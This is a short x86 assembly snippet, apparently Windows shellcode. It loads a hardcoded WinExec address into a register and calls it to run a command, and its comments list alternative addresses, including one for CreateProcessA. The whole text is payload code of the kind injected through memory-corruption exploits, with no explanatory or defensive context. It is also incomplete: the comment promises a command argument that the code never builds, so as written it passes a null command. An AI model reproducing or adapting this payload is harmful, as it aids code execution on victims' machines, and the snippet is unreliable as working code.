global _start

_start:

	xor eax,eax          ;clear eax
	push eax             ;push null onto stack
	mov ebx,0x7705fd1e   ;place winExec address into ebx 0x775b3061
	push eax
	push eax
	push eax
	push eax
	call ebx             ;call WinExec({cmd},0)  #For createProcessA : 0x77531072

